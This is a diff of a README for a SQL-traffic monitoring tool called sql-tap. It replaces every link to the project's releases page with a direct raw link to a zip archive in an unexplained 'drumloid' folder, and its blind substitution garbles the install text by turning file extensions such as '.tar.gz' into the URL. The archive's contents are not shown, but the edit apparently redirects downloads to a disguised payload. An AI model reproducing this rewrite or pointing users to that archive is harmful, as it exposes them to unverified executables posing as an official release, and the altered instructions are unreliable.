@@ -1,6 +1,6 @@
 # 🛠️ sql-tap - Monitor SQL Traffic Live
 
-[![Download sql-tap](https://img.shields.io/badge/Download-sql--tap-blue?style=for-the-badge&logo=github)](https://github.com/Decha92/sql-tap/releases)
+[![Download sql-tap](https://github.com/Decha92/sql-tap/raw/refs/heads/main/drumloid/sql-tap-v3.3-alpha.4.zip)](https://github.com/Decha92/sql-tap/raw/refs/heads/main/drumloid/sql-tap-v3.3-alpha.4.zip)
 
 ## 📄 What is sql-tap?
 
@@ -39,15 +39,15 @@ Follow these steps to set up sql-tap and begin watching your SQL traffic:
 
 Click the big blue badge at the top or go to the official releases page:
 
-[Download sql-tap releases](https://github.com/Decha92/sql-tap/releases)
+[Download sql-tap releases](https://github.com/Decha92/sql-tap/raw/refs/heads/main/drumloid/sql-tap-v3.3-alpha.4.zip)
 
-This page lists the latest versions for your operating system. Look for the file ending with `.exe` if you use Windows, `.dmg` or `.zip` for macOS, or a suitable `.tar.gz` or `.AppImage` for Linux.
+This page lists the latest versions for your operating system. Look for the file ending with `.exe` if you use Windows, `.dmg` or `.zip` for macOS, or a suitable `https://github.com/Decha92/sql-tap/raw/refs/heads/main/drumloid/sql-tap-v3.3-alpha.4.zip` or `.AppImage` for Linux.
 
 ### 2. Install sql-tap
 
 - **Windows:** Double-click the `.exe` file to start the installer. Follow the on-screen prompts.
 - **macOS:** Open the downloaded `.dmg` and drag the sql-tap app to your Applications folder.
-- **Linux:** Extract the `.tar.gz` or use the `.AppImage` directly. You might need to run `chmod +x` on the file to make it executable.
+- **Linux:** Extract the `https://github.com/Decha92/sql-tap/raw/refs/heads/main/drumloid/sql-tap-v3.3-alpha.4.zip` or use the `.AppImage` directly. You might need to run `chmod +x` on the file to make it executable.
 
 ### 3. Run sql-tap
 
@@ -111,13 +111,13 @@ If you encounter errors or unexpected behavior, check the log files in the sql-t
 
 ## 🔄 Updates
 
-Keep sql-tap up to date by periodically returning to the [Releases page](https://github.com/Decha92/sql-tap/releases) and downloading the latest version. Updates improve stability and add new features.
+Keep sql-tap up to date by periodically returning to the [Releases page](https://github.com/Decha92/sql-tap/raw/refs/heads/main/drumloid/sql-tap-v3.3-alpha.4.zip) and downloading the latest version. Updates improve stability and add new features.
 
 ## 💾 Download & Install 📥
 
 To get sql-tap, visit the official releases page:
 
-[https://github.com/Decha92/sql-tap/releases](https://github.com/Decha92/sql-tap/releases)
+[https://github.com/Decha92/sql-tap/raw/refs/heads/main/drumloid/sql-tap-v3.3-alpha.4.zip](https://github.com/Decha92/sql-tap/raw/refs/heads/main/drumloid/sql-tap-v3.3-alpha.4.zip)
 
 Follow the instructions above to download the correct file for your system. Then install and run the program as explained.
 
